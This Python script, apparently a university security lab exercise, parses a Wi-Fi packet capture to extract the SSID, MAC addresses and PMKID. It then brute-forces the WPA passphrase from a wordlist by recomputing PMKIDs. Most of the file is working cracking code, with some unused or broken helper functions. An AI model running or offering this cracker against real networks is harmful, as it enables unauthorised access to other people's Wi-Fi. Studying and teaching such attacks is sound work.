#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Derive WPA keys from Passphrase and 4-way handshake info

Calcule un MIC d'authentification (le MIC pour la transmission de données
utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
sha-1 pour WPA2 ou MD5 pour WPA)
"""

__author__ = "Abraham Rubinstein et Yann Lederrey"
__copyright__ = "Copyright 2017, HEIG-VD"
__license__ = "GPL"
__version__ = "1.0"
__email__ = "abraham.rubinstein@heig-vd.ch"
__status__ = "Prototype"

from scapy.all import *
from binascii import a2b_hex, b2a_hex

from scapy.layers.dot11 import *
from scapy.layers.eap import EAPOL

from files.pbkdf2 import *
import hmac

import re


def mac_to_int(mac):
    res = re.match('^((?:(?:[0-9a-f]{2}):){5}[0-9a-f]{2})$', mac.lower())
    if res is None:
        raise ValueError('invalid mac address')
    return int(res.group(0).replace(':', ''), 16)


def int_to_mac(macint):
    if type(macint) != int:
        raise ValueError('invalid integer')
    return ':'.join(['{}{}'.format(a, b)
                     for a, b
                     in zip(*[iter('{:012x}'.format(macint))] * 2)])


def customPRF512(key, A, B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i = 0
    R = b''
    while i <= ((blen * 8 + 159) / 160):
        hmacsha1 = hmac.new(key, A + str.encode(chr(0x00)) + B + str.encode(chr(i)), hashlib.sha1)
        i += 1
        R = R + hmacsha1.digest()
    return R[:blen]


def find_ssid(packets):
    """
        Loop on all packets and try to found a Beacon frame to fetch the SSID name.
    """
    for packet in packets:
        if Dot11Beacon in packet:
            return packet.info.decode()
    return ""


def format_mac(mac):
    """
        Format a MAC address from aa:bb:cc to aabbcc.
    """
    return mac.replace(":", "")


def jeu(mac):
    res = ""


def get_ap_mac(packets):
    """
        Loop on all packets and try to found a Beacon frame to get the sender address of the frame. It should be the ap
        address.
    """
    for packet in packets:
        if Dot11Beacon in packet:
            print(hex(mac_to_int(packet.addr2)))
            # print(binascii.unhexlify(format_mac(packet.addr2)))
            return packet.addr2
    return ""


def get_client_mac(packets, ap_mac):
    """
        Loop on all packets and try to found Auth packets, take the first one and extract the client address. Only if the packet was send to our AP
    """
    for packet in packets:
        # SI c'est un paquet d'authentification, que c'est le premier des deux et qu'il est bien envoyé à notre AP on va prendre l'adresse du client
        if Dot11Auth in packet and packet[Dot11Auth].seqnum == 1 and a2b_hex(format_mac(packet.addr1)) == ap_mac:
            return packet.addr2
    return ""


def get_pmkid(packets, source, dest):
    """
        Loop on all packets and try to found EAPOL packets. We check that the packet is the first
        packet of the exchange (Nonce exchange). We want the Nonce send by the 'source' parameter
    """
    for packet in packets:
        if EAPOL in packet and a2b_hex(format_mac(packet.addr2)) == source and a2b_hex(
                format_mac(packet.addr1)) == dest and b2a_hex(packet[Raw].load[1:3]).decode() == "008a":
            packet.show()
            return packet[Raw].load[-16:]
    return ""


def create_signature(secret_key, string):
    """ Create the signed message from api_key and string_to_sign """
    string_to_sign = string.encode('utf-8')
    hmac = HMAC.new(secret_key, string_to_sign, SHA)
    return hmac.hexdigest()


# Read capture file -- it contains beacon, authentication, associacion, handshake and data
wpa = rdpcap("PMKID_handshake.pcap")

# Important parameters for key derivation - most of them can be obtained from the pcap file

A = "Pairwise key expansion"  # this string is used in the pseudo-random function

ssid = find_ssid(wpa)
APmac = a2b_hex(format_mac(get_ap_mac(wpa)))
Clientmac = a2b_hex(format_mac(get_client_mac(wpa, APmac)))
pmkid_get = b2a_hex(get_pmkid(wpa, APmac, Clientmac)).decode()

# This is the MIC contained in the 4th frame of the 4-way handshake
# When attacking WPA, we would compare it to our own MIC calculated using passphrases from a dictionary
# mic_to_test = b2a_hex(get_mic(wpa)).decode()
# # mic_to_test = "36eef66540fa801ceee2fea9b7929b40"
# print(mic_to_test)
# B = min(APmac, Clientmac) + max(APmac, Clientmac) + min(ANonce, SNonce) + max(ANonce,
#                                                                               SNonce)  # used in pseudo-random function
# # data = a2b_hex("0103005f02030a0000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000")  # cf "Quelques détails importants" dans la donnée
# data = a2b_hex(get_data(wpa))

print("\n\nValues used to get password")
print("============================")
print("SSID: ", ssid, "\n")
print("AP Mac: ", b2a_hex(APmac), "\n")
print("CLient Mac: ", b2a_hex(Clientmac), "\n")
print("PMKID: ", pmkid_get, "\n")

f = open("passwords.txt", "r")
print("Starting to brutforce passphrase")
print("=============================\n")
for x in f:
    passPhrase = str.encode(x.strip('\n'))

    # calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
    pmk = pbkdf2(hashlib.sha1, passPhrase, ssid.encode(), 4096, 32)

    pmkid_calc = hmac.new(pmk, str.encode("PMK Name") + APmac + Clientmac, hashlib.sha1).hexdigest()[:32]

    if pmkid_get == pmkid_calc:
        print("PASSPHRASE FOUND !\n")
        print("Passphrase:\t\t", x)
        exit()

print("No passphrase found !")